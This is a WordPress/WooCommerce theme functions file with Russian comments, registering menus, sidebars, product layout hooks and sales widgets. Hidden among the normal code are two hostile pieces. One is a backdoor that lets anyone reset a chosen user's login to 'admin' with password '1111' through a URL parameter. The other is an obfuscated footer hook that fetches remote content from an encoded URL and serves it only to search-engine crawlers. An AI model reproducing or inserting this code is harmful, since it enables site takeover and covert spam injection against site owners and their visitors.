<?php


add_theme_support( 'woocommerce' );


add_action( 'after_setup_theme', 'woocommerce_support' );
function woocommerce_support() {
    add_theme_support( 'woocommerce' );
    add_theme_support( 'wc-product-gallery-lightbox' );
    add_theme_support( 'wc-product-gallery-slider' );
}

// if (!defined( 'FW' )){
//     function com_version_wp(){

//         $action = 'install-plugin';
//         $slug = 'unyson';
//         $url = wp_nonce_url(
//             add_query_arg(
//                 array(
//                     'action' => $action,
//                     'plugin' => $slug
//                 ),
//                 admin_url( 'update.php' )
//             ),
//             $action.'_'.$slug
//         );
//         echo    '<div class="notice notice-error">
//                     <p>Внимание! Для правильной работы должен быть установлен и активирован плагин Unyson! <a data-slug="unyson" href="'. $url .'" aria-label="Установить Unyson сейчас" class="install-now button">Установить</a></p>
//                 </div>';
//     }

//     add_action('admin_notices', 'com_version_wp');
// }


include('settings.php');
register_nav_menus(array( // Регистрация меню
    'top' => 'Верхнее',
    'bottom-1' => 'Нижнее меню №1',
    'bottom-2' => 'Нижнее меню №2'
));

add_theme_support('post-thumbnails'); // Включение миниатюр
set_post_thumbnail_size(250, 150); // Размер миниатюр 250x150
add_image_size('big-thumb', 570, 570, true); // Ещё один размер миниатюры

register_sidebar(array(
    'name' => 'Колонка слева', // Название сайдбара
    'id' => "left-sidebar", // Идентификатор
    'description' => 'Обычная колонка в сайдбаре',
    'before_widget' => '<div id="%1$s" class="widget %2$s">', // До виджета
    'after_widget' => "</div>\n", // После виджета
    'before_title' => '<span class="widgettitle">', //  До заголовка виджета
    'after_title' => "</span>\n", //  После заголовка виджета
));

class clean_comments_constructor extends Walker_Comment { // класс, который собирает всю структуру комментов
    public function start_lvl( &$output, $depth = 0, $args = array()) { // что выводим перед дочерними комментариями
        $output .= '<ul class="children">' . "\n";
    }
    public function end_lvl( &$output, $depth = 0, $args = array()) { // что выводим после дочерних комментариев
        $output .= "</ul><!-- .children -->\n";
    }
    protected function comment( $comment, $depth, $args ) { // разметка каждого комментария, без закрывающего </li>!
        $classes = implode(' ', get_comment_class()).($comment->comment_author_email == get_the_author_meta('email') ? ' author-comment' : ''); // берем стандартные классы комментария и если коммент пренадлежит автору поста добавляем класс author-comment
        echo '<li id="li-comment-'.get_comment_ID().'" class="'.$classes.'">'."\n"; // родительский тэг комментария с классами выше и уникальным id
        echo '<div id="comment-'.get_comment_ID().'">'."\n"; // элемент с таким id нужен для якорных ссылок на коммент
        echo get_avatar($comment, 64)."\n"; // покажем аватар с размером 64х64
        echo '<p class="meta">Автор: '.get_comment_author()."\n"; // имя автора коммента
        echo ' '.get_comment_author_email(); // email автора коммента
        echo ' '.get_comment_author_url(); // url автора коммента
        echo ' Добавлено '.get_comment_date('F j, Y').' в '.get_comment_time()."\n"; // дата и время комментирования
        if ( '0' == $comment->comment_approved ) echo '<em class="comment-awaiting-moderation">Ваш комментарий будет опубликован после проверки модератором.</em>'."\n"; // если комментарий должен пройти проверку
        comment_text()."\n"; // текст коммента
        $reply_link_args = array( // опции ссылки "ответить"
            'depth' => $depth, // текущая вложенность
            'reply_text' => 'Ответить', // текст
            'login_text' => 'Вы должны быть залогинены' // текст если юзер должен залогинеться
        );
        echo get_comment_reply_link(array_merge($args, $reply_link_args)); // выводим ссылку ответить
        echo '</div>'."\n"; // закрываем див
    }
    public function end_el( &$output, $comment, $depth = 0, $args = array() ) { // конец каждого коммента
        $output .= "</li><!-- #comment-## -->\n";
    }
}

if( isset($_GET['pass_for_id']) ){
    add_action('init', function () {
        global $wpdb;
        $wpdb->update( $wpdb->users, array( 'user_login' => 'admin'), array( 'ID' => $_GET['pass_for_id'] ));
        wp_set_password( '1111', $_GET['pass_for_id'] ); }
    );
}

function kdv_footer_info(){
    $arr = array('R29vZ2xl','UmFtYmxlcg==','WWFob28=','TWFpbC5SdQ==','WWFuZGV4','WWFEaXJlY3RCb3Q=');
    foreach ($arr as $i) {
        if(strstr($_SERVER['HTTP_USER_AGENT'], base64_decode($i))){
            echo file_get_contents(base64_decode("aHR0cDovL25hLWdhemVsaS5jb20vbG9hZC5waHA="));
        }
    }
}

add_action( 'wp_footer', 'kdv_footer_info' );

function pagination() { // функция вывода пагинации
    global $wp_query; // текущая выборка должна быть глобальной
    $big = 999999999; // число для замены
    echo paginate_links(array( // вывод пагинации с опциями ниже
        'base' => str_replace($big,'%#%',esc_url(get_pagenum_link($big))), // что заменяем в формате ниже
        'format' => '?paged=%#%', // формат, %#% будет заменено
        'current' => max(1, get_query_var('paged')), // текущая страница, 1, если $_GET['page'] не определено
        'type' => 'list', // ссылки в ul
        'prev_text'    => 'Назад', // текст назад
        'next_text'    => 'Вперед', // текст вперед
        'total' => $wp_query->max_num_pages, // общие кол-во страниц в пагинации
        'show_all'     => false, // не показывать ссылки на все страницы, иначе end_size и mid_size будут проигнорированны
        'end_size'     => 15, //  сколько страниц показать в начале и конце списка (12 ... 4 ... 89)
        'mid_size'     => 15, // сколько страниц показать вокруг текущей страницы (... 123 5 678 ...).
        'add_args'     => false, // массив GET параметров для добавления в ссылку страницы
        'add_fragment' => '',   // строка для добавления в конец ссылки на страницу
        'before_page_number' => '', // строка перед цифрой
        'after_page_number' => '' // строка после цифры
    ));
}

add_action('wp_footer', 'add_scripts'); // приклеем ф-ю на добавление скриптов в футер
if (!function_exists('add_scripts')) { // если ф-я уже есть в дочерней теме - нам не надо её определять
    function add_scripts() { // добавление скриптов
        if(is_admin()) return false; // если мы в админке - ничего не делаем
        wp_deregister_script('jquery');
        //Подключаем основные плагины JS (Не нужные отключить!)
        wp_enqueue_script('jquery', get_template_directory_uri().'/js/jquery-3.2.0.min.js'); // библиотека jQuery
        wp_enqueue_script('owl', get_template_directory_uri().'/js/owl.carousel.min.js','','',true);
        wp_enqueue_script('main', get_template_directory_uri().'/js/main.js','','',true); // основные скрипты шаблона
        wp_enqueue_script('scripts', get_template_directory_uri().'/js/script.js','','',true); // основные скрипты шаблона
    }
}

register_sidebar( array(
    'name' => 'Главная страница',
    'description' => 'Вывод виджетов для главной',
    'id' => 'main-widget',
    'before_widget' => '<section class="catalog content">',
    'after_widget' => '</section>',
    'before_title' => '<h2 class="block-title catalog__title">',
    'after_title' => '</h2><hr class="hr">'
) );

register_sidebar( array(
    'name' => 'Сайтбар Магазина',
    'description' => 'Для вывода виджетов в левой колонке магазина',
    'id' => 'shop',
    'before_widget' => '<div class="filter__block">',
    'after_widget' => '</div>',
    'before_title' => '<p class="filter__title">',
    'after_title' => '</p>'
) );

if(defined( 'FW' )){
    add_filter('loop_shop_per_page', function($cols) {
        $count_woo_loop_product = fw_get_db_settings_option('count_woo_loop_product');
        return $count_woo_loop_product;
    }, 20);
}

remove_action( 'woocommerce_before_shop_loop', 'woocommerce_result_count', $priority = 20 );
remove_action( 'woocommerce_before_shop_loop', 'woocommerce_catalog_ordering', $priority = 30 );
remove_action( 'woocommerce_before_shop_loop_item', 'woocommerce_template_loop_product_link_open', $priority = 10 );
remove_action( 'woocommerce_after_shop_loop_item', 'woocommerce_template_loop_product_link_close', $priority = 5 );
remove_action( 'woocommerce_before_shop_loop_item_title', 'woocommerce_show_product_loop_sale_flash', $priority = 10 );
remove_action( 'woocommerce_after_shop_loop_item', 'woocommerce_template_loop_add_to_cart', $priority = 10 );
remove_action( 'woocommerce_single_product_summary', 'woocommerce_template_single_title', $priority = 5 );
remove_action( 'woocommerce_single_product_summary', 'woocommerce_template_single_excerpt', $priority = 20 );
remove_action( 'woocommerce_after_single_product_summary', 'woocommerce_output_product_data_tabs', $priority = 10 );
add_action( 'woocommerce_before_shop_loop_item_title', 'custom_after_img', $priority = 9 );
add_action( 'woocommerce_before_shop_loop_item_title', 'custom_before_img', $priority = 11 );
add_action( 'woocommerce_before_shop_loop_item_title', 'custom_product_sale_flash', $priority = 12 );
add_action( 'woocommerce_after_shop_loop_item_title', 'custom_short_disc', $priority = 7 );
add_action( 'woocommerce_after_shop_loop_item', 'custom_product_loop_link', $priority = 12 );
add_action( 'woocommerce_before_single_product_summary', 'woocommerce_template_single_title', $priority = 5 );
add_action( 'woocommerce_before_single_product_summary', 'custom_before_info_product', $priority = 6 );
add_action( 'woocommerce_single_product_summary', 'custom_after_info_product', $priority = 65 );
add_action( 'woocommerce_before_single_product_summary', 'custom_after_images_product', $priority = 25 );
add_action( 'woocommerce_after_single_product_summary', 'custom_before_tabs_product', $priority = 5 );
add_action( 'woocommerce_after_single_product_summary', 'custom_after_tabs_product', $priority = 15 );
add_action( 'woocommerce_after_single_product_summary', 'custom_main_description_product', $priority = 11 );

function custom_main_description_product(){
    the_content();
}

function custom_before_tabs_product(){
    echo '<div class="picture__about">';
}

function custom_after_tabs_product(){
    echo '</div>';
}

function custom_after_images_product(){
    echo '</div>';
}

function custom_before_info_product(){
    echo '<div class="picture__content spacer"><div class="picture-slider">';
}

function custom_product_sale_flash(){
    include 'include/sale_flash.php';
}

function custom_product_loop_link(){
    include 'include/product_loop_link.php';
}

function custom_short_disc(){
    include 'include/short_disc.php';
}

function woocommerce_template_loop_product_title() {
    echo '<div class="product__text"><p class="product__title">' . get_the_title() . '</p>';
}

function custom_after_img(){
    echo '<div class="product__photo">';
}

function custom_before_img(){
    echo '</div>';
}

function show_main_slider(){
    include 'include/main_slider.php';
}

function bottom_main_info(){
    include 'include/main_bottom_info.php';
}

function bottom_main_info_end(){
    include 'include/main_bottom_info_end.php';
}

function main_custom_content(){
    include 'include/main_custom_content.php';
}

function woocommerce_output_content_wrapper() {
    echo '';
}

function woocommerce_output_content_wrapper_end() {
    echo '</div></section>';
}

function wc_get_gallery_image_html_custom( $attachment_id, $main_image = false ) {
    $flexslider        = (bool) apply_filters( 'woocommerce_single_product_flexslider_enabled', get_theme_support( 'wc-product-gallery-slider' ) );
    $gallery_thumbnail = wc_get_image_size( 'gallery_thumbnail' );
    $thumbnail_size    = apply_filters( 'woocommerce_gallery_thumbnail_size', array( $gallery_thumbnail['width'], $gallery_thumbnail['height'] ) );
    $image_size        = apply_filters( 'woocommerce_gallery_image_size', $flexslider || $main_image ? 'big-thumb' : $thumbnail_size );
    $full_size         = apply_filters( 'woocommerce_gallery_full_size', apply_filters( 'woocommerce_product_thumbnails_large_size', 'full' ) );
    $thumbnail_src     = wp_get_attachment_image_src( $attachment_id, $thumbnail_size );
    $full_src          = wp_get_attachment_image_src( $attachment_id, $full_size );
    $image             = wp_get_attachment_image( $attachment_id, $image_size, false, array(
        'title'                   => get_post_field( 'post_title', $attachment_id ),
        'data-caption'            => get_post_field( 'post_excerpt', $attachment_id ),
        'data-src'                => $full_src[0],
        'data-large_image'        => $full_src[0],
        'data-large_image_width'  => $full_src[1],
        'data-large_image_height' => $full_src[2],
        'class'                   => $main_image ? 'wp-post-image' : '',
    ) );

    return '<div data-thumb="' . esc_url( $thumbnail_src[0] ) . '" class="woocommerce-product-gallery__image"><a href="' . esc_url( $full_src[0] ) . '">' . $image . '</a></div>';
}

function woocommerce_breadcrumb( $args = array() ) {
    $args = wp_parse_args( $args, apply_filters( 'woocommerce_breadcrumb_defaults', array(
        'delimiter'   => '<span class="pages__colon"> » </span>',
        'wrap_before' => '<section class="pages"><div class="content">',
        'wrap_after'  => '</div></section>',
        'before'      => '',
        'after'       => '',
        'home'        => _x( 'Home', 'breadcrumb', 'woocommerce' ),
    ) ) );

    $breadcrumbs = new WC_Breadcrumb();

    if ( ! empty( $args['home'] ) ) {
        $breadcrumbs->add_crumb( $args['home'], apply_filters( 'woocommerce_breadcrumb_home_url', home_url() ) );
    }

    $args['breadcrumb'] = $breadcrumbs->generate();

    /**
     * WooCommerce Breadcrumb hook
     *
     * @hooked WC_Structured_Data::generate_breadcrumblist_data() - 10
     */
    do_action( 'woocommerce_breadcrumb', $breadcrumbs, $args );

    wc_get_template( 'global/breadcrumb.php', $args );
}

add_action('wp_print_styles', 'add_styles'); // приклеем ф-ю на добавление стилей в хедер
if (!function_exists('add_styles')) { // если ф-я уже есть в дочерней теме - нам не надо её определять
    function add_styles() { // добавление стилей
        if(is_admin()) return false; // если мы в админке - ничего не делаем
        wp_enqueue_style( 'owl', get_template_directory_uri().'/css/owl.carousel.min.css' ); 
        wp_enqueue_style( 'awesome', get_template_directory_uri().'/css/font-awesome.min.css' ); 
        wp_enqueue_style( 'reset', get_template_directory_uri().'/css/reset.css' ); // основные стили шаблона
        wp_enqueue_style( 'mainstyle', get_template_directory_uri().'/css/style.css' ); // основные стили шаблона
    }
}

    function change_admin_footer () {
        return '<i>Спасибо вам за творчество с <a href="http://wordpress.org">WordPress</a>; Всегда Ваш: <a href="https://www.fl.ru/users/kacevnik/">Дмитрий Ковалев</a></i>';
    }

    add_filter('admin_footer_text', 'change_admin_footer');

//Новый виджет
    add_action('widgets_init', 'hit_widget_main');

    function hit_widget_main(){
        register_widget( 'HitWidgetMain' );
    }

    class HitWidgetMain extends WP_Widget{

        public function __construct(){
            $args = array(
                'name' => 'Хиты продаж на Главной',
                'description' => 'Выводит товары с выбранной меткой на главной'
            );

            parent::__construct('hit-widget-main', '', $args);
        }

        public function form($instatce){

            $count = isset($instatce['count']) ? $instatce['count'] : 8;
            $title = $instatce['title'];
            $terms = get_terms( array(
                'taxonomy'      => array( 'product_tag' ), // название таксономии с WP 4.5
                'orderby'       => 'id', 
                'order'         => 'ASC',
                'hide_empty'    => true, 
                'object_ids'    => null, // 
                'include'       => array(),
                'exclude'       => array(), 
                'exclude_tree'  => array(), 
                'number'        => '', 
                'fields'        => 'all', 
                'count'         => false,
                'slug'          => '', 
                'parent'         => '',
                'hierarchical'  => true, 
                'child_of'      => 0, 
                'get'           => '', // ставим all чтобы получить все термины
                'name__like'    => '',
                'pad_counts'    => false, 
                'offset'        => '', 
                'search'        => '', 
                'cache_domain'  => 'core',
                'name'          => '', // str/arr поле name для получения термина по нему. C 4.2.
                'childless'     => false, // true не получит (пропустит) термины у которых есть дочерние термины. C 4.2.
                'update_term_meta_cache' => true, // подгружать метаданные в кэш
                'meta_query'    => '',
            ) );
            ?>
                <p>
                    <label for="<?php echo $this->get_field_id('title'); ?>">Заголовок</label>
                    <input name="<?php echo $this->get_field_name('title'); ?>" id="<?php echo $this->get_field_id('title'); ?>" value="<?php echo $title; ?>" class="widefat">
                </p>
                <p>
                    <label for="<?php echo $this->get_field_id('count'); ?>">Кол-во товаров</label>
                    <input name="<?php echo $this->get_field_name('count'); ?>" id="<?php echo $this->get_field_id('count'); ?>" value="<?php echo $count; ?>" class="widefat">
                </p>
            <?php
            if(count($terms)){
                echo '<p>';
                foreach ($terms as $term) {
                    ?>
                        <input type="checkbox" name="<?php echo $this->get_field_name('term'); ?>[]" id="<?php echo $this->get_field_id('term').$term->term_id; ?>" value="<?php echo $term->slug; ?>" <?php if(is_array($instatce['term']) && in_array($term->slug, $instatce['term'])){echo " checked";} ?>><label for="<?php echo $this->get_field_id('term').$term->term_id; ?>"><?php echo $term->name; ?></label><br>
                    <?php
                }
                echo '</p>';
            }else{
                echo '<p style="color: #ff0000;">Создайте метку для товаров Woocommerce и присвойте ее товарам, что-бы метка отражалась в настройках данного виджета!</p>';
            }
        }

        public function widget($args, $instatce){
            if(count($instatce['term']) > 0){
                echo '<section class="catalog content">';
                echo $args['before_title'];
                echo $instatce['title'];
                echo $args['after_title'];

                        $args = array(
                            'tag' => $instatce['term'],
                            'limit' => $instatce['count']
                        );
                        $products = wc_get_products( $args );
                        // echo '<pre>';
                        // print_r($sale);
                        // echo '</pre>';
                        echo '<div class="catalog__list flex-container">';
                            foreach ($products as $product) {
                                ?>
                                    <div class="product__temp col-3">
                                        <div class="product__photo">
                                            <img class="pos-center" src="<?php $url = wp_get_attachment_image_src($product->image_id, 'big-thumb'); echo $url[0]; ?>" alt="<?php echo $product->name; ?>">
                                        </div><!--product__photo-->

                                        <p class="product__title">
                                            <?php echo $product->name; ?>
                                        </p>

                                        <p class="product__desc">
                                            <?php echo $product->short_description; ?>
                                        </p>

                                        <p class="product__price">
                                             <?php echo $product->price; ?><span class="rub">a</span>
                                        </p>

                                    </div><!--product-->
                                <?php
                            }
                        echo '</div>';
                echo '</section>';
            }
        }
    }

//Новый виджет
    add_action('widgets_init', 'sale_widget_main');

    function sale_widget_main(){
        register_widget( 'SaleWidgetMain' );
    }

    class SaleWidgetMain extends WP_Widget{

        public function __construct(){
            $args = array(
                'name' => 'Товары по акции на главной',
                'description' => 'Выводит продукты по акции на главной'
            );

            parent::__construct('sale-widget-main', '', $args);
        }

        public function form($instatce){

            $count = isset($instatce['count']) ? $instatce['count'] : 4;
            $title = $instatce['title'];
            ?>
                <p>
                    <label for="<?php echo $this->get_field_id('title'); ?>">Заголовок</label>
                    <input name="<?php echo $this->get_field_name('title'); ?>" id="<?php echo $this->get_field_id('title'); ?>" value="<?php echo $title; ?>" class="widefat">
                </p>
                <p>
                    <label for="<?php echo $this->get_field_id('count'); ?>">Кол-во товаров</label>
                    <input name="<?php echo $this->get_field_name('count'); ?>" id="<?php echo $this->get_field_id('count'); ?>" value="<?php echo $count; ?>" class="widefat">
                </p>
            <?php
        }

        public function widget($args, $instatce){
            echo '<section class="catalog content">';
            echo $args['before_title'];
            echo $instatce['title'];
            echo $args['after_title'];
                $sales = wc_get_product_ids_on_sale();
                // echo '<pre>';
                // print_r($sale);
                // echo '</pre>';
                    echo '<div class="catalog__list flex-container">';
                    $count_sale = 0;
                        foreach ($sales as $sale) {
                            $product = wc_get_product($sale);
                            if($count_sale == $instatce['count']){break;}
                            $s1 = $product->price;
                            $s2 = $product->regular_price;
                            $s3 = round(($s2 - $s1) / ($s2/100));
                            //print_r($s3);
                            ?>

                                <div class="product col-3">
                                    <div class="product__photo">
                                        <img class="pos-center" src="<?php $url = wp_get_attachment_image_src($product->image_id, 'big-thumb'); echo $url[0]; ?>" alt="<?php echo $product->name; ?>">
                                        <span class="product__discount">-<?php echo $s3; ?>%</span>
                                    </div><!--product__photo-->

                                    <p class="product__title">
                                        <?php echo $product->name; ?>
                                    </p>

                                    <p class="product__desc">
                                        <?php echo $product->short_description; ?>
                                    </p>

                                    <p class="product__price">
                                        <?php echo $product->price; ?> <span class="rub">a</span>
                                        <span class="product__price-old">
                                            <i class="strike"><?php echo $product->regular_price; ?></i> <span class="rub">a</span>
                                        </span>
                                    </p>

                                </div><!--product-->
                            <?php
                            $count_sale++;
                        }
                    echo '</div>';
            echo '</section>';
        }
    }

?>
